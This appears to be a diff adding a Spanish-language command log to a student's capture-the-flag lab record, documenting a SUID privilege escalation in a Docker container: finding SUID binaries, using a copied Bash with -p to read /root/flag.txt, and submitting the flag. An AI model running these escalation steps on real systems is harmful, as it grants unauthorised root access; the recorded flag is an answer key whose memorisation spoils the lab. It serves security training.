@@ -24,3 +24,33 @@ docker exec -u operador cyberlab-phantomcorp bash -lc "id; hostname; echo '--- c
 # 3. Presentación de flags: pendiente de ejecutar desde una instalación Unix/WSL
 # con finales de línea LF. No se registró una salida de `ctf submit` en esta entrega.
 
+# --- P3 — R3: escalada de privilegios mediante SUID ---
+# Fecha de ejecución: 2026-10-23
+
+# Comandos ejecutados dentro del contenedor víctima,
+# como usuario operador (docker exec -u operador -it cyberlab-phantomcorp bash).
+
+# 1. Comprobar la identidad inicial.
+id | tee /tmp/r3-identidad.txt
+
+# 2. Enumerar los archivos con permiso SUID.
+find / -type f -perm -4000 2>/dev/null | tee /tmp/r3-suid-enumeracion.txt
+
+# 3. Examinar el binario no estándar encontrado.
+ls -l /usr/local/bin/system-check
+
+# 4. Comprobar que system-check es una copia de Bash.
+sha256sum /usr/local/bin/system-check /bin/bash
+
+# 5. Comprobar la ejecución con privilegios efectivos de root.
+/usr/local/bin/system-check -p -c 'id' | tee /tmp/r3-privesc-identidad.txt
+
+# 6. Leer exclusivamente el archivo protegido indicado por la consigna.
+/usr/local/bin/system-check -p -c 'cat /root/flag.txt' | tee /tmp/r3-privesc-flag.txt
+
+# Resultado: euid=0(root) y FLAG{privesc_suid_root}
+
+# Comando ejecutado desde Git Bash, en la raíz del repositorio.
+./ctf submit 08 R3 'FLAG{privesc_suid_root}'
+
+# Resultado: [ OK ] Reto R3 resuelto: Escalada de privilegios (SUID)
